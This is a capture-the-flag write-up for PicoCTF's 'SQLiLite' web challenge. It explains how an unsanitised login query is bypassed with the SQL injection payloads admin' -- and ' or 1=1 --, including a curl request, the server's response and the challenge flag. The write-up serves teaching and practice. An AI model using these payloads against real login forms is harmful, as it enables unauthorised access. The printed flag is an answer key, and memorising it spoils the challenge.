---
title: "PicoCTF - SQLiLite"
author: r2cook
categories:
  - PicoCTF
tags:
  - SQLI
  - SQLite
  - authentication-bypass
render_with_liquid: false
media_subpath: /images/picoctf/SQLiLite/
image:
  path: room_card.png
---
# SQLiLite

**Platform:** PicoCTF 2021  
**Category:** Web Exploitation  
**Difficulty:** Medium 

---

## Description

Can you log in to this website?  
Target: [http://saturn.picoctf.net:64736/](http://saturn.picoctf.net:64736/)

---

## Given Files / Access

- **Files:** None
    
- **URL:** [http://saturn.picoctf.net:64736/](http://saturn.picoctf.net:64736/)
    
- **Target:** saturn.picoctf.net:64736
    

---

## Initial Recon / Enumeration

**Tools Used:**

- Browser
    
- Burp Suite
    

**Observations:**

- The application presents a standard login form (username / password).
    
- No strong client-side validation is observed.
    
- The login request was intercepted using Burp Suite for further inspection.
    

---

## Analysis

### What is happening?

The backend appears to validate credentials using a SQL query that directly incorporates user input.

A typical query structure is likely:

```sql
SELECT * FROM users 
WHERE username = 'INPUT' AND password = 'INPUT';
```

---

### What is the vulnerability?

The application is vulnerable to **SQL Injection** due to improper input sanitization.

User-controlled input is directly embedded into the SQL query without escaping or parameterization.

---

### Key Insight

By injecting SQL syntax, we can manipulate the query logic.

Using:

```sql
' --
```

- `'` closes the original string
    
- `--` starts a SQL comment
    
- Everything after `--` is ignored by the database
    

---

## Exploitation / Solution

### Steps:

1. Intercept the login request using Burp Suite.

![](13_1.png){: width="800" height="400" .shadow }
    
2. Modify the `username` parameter:
    

```sql
admin' --
```

3. The resulting query becomes:
    

```sql
SELECT * FROM users 
WHERE username = 'admin' -- ' AND password = 'anything';
```

4. The password condition is commented out.
    
5. Authentication is bypassed, granting access as the `admin` user without knowing the password.
    
![](13_2.png){: width="800" height="400" .shadow }


Another Solution using `curl` :

```shell
$ curl --data "username=admin&password=' or 1=1 --" http://saturn.picoctf.net:56873/login.php

<pre>username: admin  
password: &#039; or 1=1 --  
SQL query: SELECT * FROM users WHERE name=&#039;admin&#039; AND password=&#039;&#039; or 1=1 --&#039;  
</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_i  
t_9b0a4e21}</p>%
```
{: .nolineno }


---

## Flag

```css
picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}
```

---